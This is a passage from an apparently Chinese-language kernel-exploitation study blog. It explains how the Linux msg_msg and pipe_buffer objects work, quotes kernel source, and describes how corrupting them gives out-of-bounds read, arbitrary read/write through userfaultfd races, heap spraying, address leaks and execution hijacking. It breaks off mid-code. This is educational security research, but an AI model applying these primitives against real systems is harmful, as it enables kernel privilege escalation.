title="msg"></a>msg</h2><p><strong>申请obj大小:64-4k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:任意读|任意写|堆喷</strong></p><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p><strong>msgget</strong></p><p>其中msgget用于创建一个消息队列时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> msgflag)</span></span><br></pre></td></tr></table></figure><ul><li>key:值为函数ftok的返回值或<code>IPC_PRIVATE</code>，若为<code>IPC_PRIVATE</code>则直接创建新的消息队列</li><li>msgflag:<code>IPC_CREAT</code>:创建新的消息队列。 <code>IPC_EXCL</code>:与<code>IPC_CREAT</code>一同使用，表示如果要创建的消息队列已经存在，则返回错误。(<code>IPC_EXCL</code>没有什么实质性的意义，但是可以帮我们确定是新建了消息队列而不是返回已经存在的消息队列) <code>IPC_NOWAIT</code>:读写消息队列要求无法满足时，不阻塞。返回值： 调用成功返回队列标识符,否则返回-1. 其中该参数需要配合权限控制符，例如<code>0666|IPC_CREAT</code></li></ul><p>在内核空间中会创建一个 <code>msg_queue</code> 结构体,其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><strong>msgsnd</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">const</span> <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msqid:队列标识符</li><li>msgp:指向发送的消息,消息的前八个字节必须是msgtyp(值可以自定义),后面跟真正的消息</li><li>msgsz:真正的消息长度</li><li>msgflg:标志位<ul><li>0:消息队列满时,msgsnd阻塞直到消息能够写入消息队列</li><li>IPC_NOWAIT:消息队列满时不等待立即返回</li><li>IPC_NOERROR:若发送的消息长度大于msgsz,则截断</li></ul></li></ul><p>msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，会建立<code>msg_msg</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/wjzFeZiDUpxXVKJ.png" alt=""></p><p>若是消息队列中只有一个消息则是这样:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sD9xtpaHrQ2uneZ.png" alt=""></p><p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p><p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/5IcVxRaFQtg3HCW.png" alt=""></p><p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p><p><strong>msgrcv</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp,<span class="type">int</span> msgflg)</span></span><br></pre></td></tr></table></figure><ul><li>msgqid:消息队列标识符</li><li>msgp:存放消息的结构体,消息类型msgtyp也会放到这里</li><li>msgsz:接收消息长度,不包含消息类型</li><li>msgtyp:<ul><li>0:接收第一个消息</li><li>>0:接收消息类型等于msgtyp的第一个函数</li><li>&lt;0:返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li></ul></li><li>msgflg:<ul><li>0：msgrcv() 调用阻塞直到接收消息成功为止</li><li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li><li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink,从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</li><li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li></ul></li></ul><p><strong>MSG_COPY</strong></p><p><code>MSG_COPY</code>位为1的时候,在<code>find_msg</code>中会返回<code>msg_msg</code>双向循环链表中，第<code>msgtyp</code>个<code>msg_msg</code>，也就是返回第<code>msgtyp</code>条消息，而不是根据<code>msgtyp</code>去和<code>msg-&gt;m_type</code>进行匹配</p><p>此外必须同时搭配<code>IPC_NOWAIT</code>标志</p><p>对于 <code>MSG_COPY</code> 而言，数据的拷贝使用的是 <code>copy_msg()</code> 函数，其会比对<strong>源消息的 m_ts 是否大于存储拷贝的消息的 m_ts ，若大于则拷贝失败</strong>，而后者则为我们传入 <code>msgrcv()</code> 的 <code>msgsz</code>，因此若我们仅读取单条消息则需要保证<strong>后者大于相等前者</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;<span class="comment">//以源 msg 链表尾为终止</span></span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>内存越界读</strong></p><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><p><strong>任意地址读</strong></p><p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p><p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址上的数据为 NULL</strong></p><p><strong>任意地址写</strong></p><p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程<strong>，即空间的分配与数据的拷贝是分开进行的</strong></p><p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd/FUSE 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p><strong>申请obj大小:192</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p><strong>申请obj大小:任意(默认1k</strong>)</p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:泄露直接映射区地址</strong></p><p>当创建一个管道时,会自动创建<code>PIPE_DEF_BUFFERS(16)</code>个<code>pipe_buffer</code>,(只有在使用时才会按需分配初始化)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>offset是读取的偏移,len是可读的长度,写入的偏移是offset+len</p><p>一个管道的<code>pipe_buffer</code>数量是可以更改的</p><p>存在一个系统调用fcntl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = round_pipe_size(arg);</span><br><span class="line">nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment"> * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment"> * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment"> * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment"> * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line"> too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">is_unprivileged_user()) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment"> * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment"> * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment"> * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indexes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line"><span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;nrbufs - tail;</span><br><span class="line"><span class="keyword">if</span> (head)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="keyword">if</span> (tail)</span><br><span class="line"><span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;buffers = nr_pages;</span><br><span class="line"><span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当选项为<code>F_SETPIPE_SZ</code></p><p>其会修改当前pipe的bufs数组大小为第三个参数<code>(arg&gt;&gt;12)*sizeof(*bufs)</code></p><p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p><p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p><p>不过注意arg&gt;&gt;12必须是2的幂次方</p><hr><p><strong>劫持执行流</strong></p><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 